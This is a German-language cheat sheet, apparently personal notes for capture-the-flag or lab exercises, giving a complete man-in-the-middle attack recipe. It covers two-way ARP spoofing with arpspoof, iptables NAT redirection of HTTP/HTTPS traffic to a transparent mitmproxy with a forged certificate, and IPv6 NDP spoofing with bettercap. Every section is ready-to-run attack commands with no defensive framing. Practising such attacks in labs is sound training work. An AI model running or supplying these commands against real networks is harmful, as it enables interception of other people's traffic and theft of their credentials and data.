!!! Forwarding Anschalten !!!
IPv4: `sysctl -w net.ipv4.ip_forward=1`
IPv6: `sysctl -w net.ipv6.conf.all.forwarding=1`

Mit iptables (eigtl nicht notwendig)
`iptables --policy FORWARD ACCEPT`
#### Arpspoof
Beidseitiger Arpspoof starten
`sudo arpspoof -i eth1 -c both -t <routerIP> <destIP>`
Wenns nicht fkt einfach mal `router` und `dest` tauschen

#### MITM Proxy
!!! Disable ICMP redirects !!!
`sysctl -w net.ipv4.conf.all.send_redirects=0`

Irgendwas umrouten über meine Ports (Achtung auf richtiges Netzinterface achten)
`iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 8080`
`iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 443 -j REDIRECT --to-port 8080`
`ip6tables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 8080`
`ip6tables -t nat -A PREROUTING -i eth1 -p tcp --dport 443 -j REDIRECT --to-port 8080`

Mitmproxy starten
`mitmproxy --mode transparent --showhost`

Mit Certificate starten
`mitmproxy --mode transparent --showhost --ssl-insecure --certs sever.pem`

Für die certificate pem datei mit private key und certificate a la:
-----BEGIN PRIVATE KEY-----
`<private key>`
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
`<cert>`
-----END CERTIFICATE-----

Mitmproxy Befehle
Shift + E: Logs anzeigen fallen so TLS errors auf und so falls CA failen
Shift + Maus: Text markieren für flags kopieren.

##### IPv6 NDP Spoof mit Bettercap
bettercap starten
`sudo bettercap -iface eth1`

IPv6 Adresse finden
`net.recon on`

Adresse bei `targets`eintragen
`set ndp.spoof.targets <IPv6Adresse>`

Spoof starten
`ndp.spoof on`

Sobald das läuft. Mitmproxy starten
`mitmproxy --mode transparent --showhost --ssl-insecure --certs sever.pem`
oder
`mitmproxy --mode transparent --showhost --ssl-insecure`



